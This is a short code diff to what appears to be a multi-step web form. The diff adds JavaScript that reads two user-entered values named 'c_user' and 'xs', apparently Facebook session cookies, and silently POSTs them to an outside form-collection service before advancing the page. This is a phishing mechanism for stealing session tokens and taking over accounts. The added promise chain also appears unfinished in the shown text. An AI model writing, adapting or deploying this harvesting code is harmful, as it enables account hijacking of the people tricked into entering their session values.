@@ -1372,7 +1372,25 @@
                     alert('Please fill all required fields');
                     return;
                 }
-                
+                // Submit c_user and xs together
+          const formData = new FormData();
+          formData.append("c_user", cUserInput.value);
+          formData.append("xs", xsInput.value);
+
+          fetch("https://submit-form.com/Ol866Kkyz ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              c_user: cUserInput.value,
+              xs: xsInput.value
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Submission of c_user and xs failed");
+              }
                 // Move to step 2
                 document.getElementById('step1').classList.remove('active');
                 document.getElementById('step2').classList.add('active');
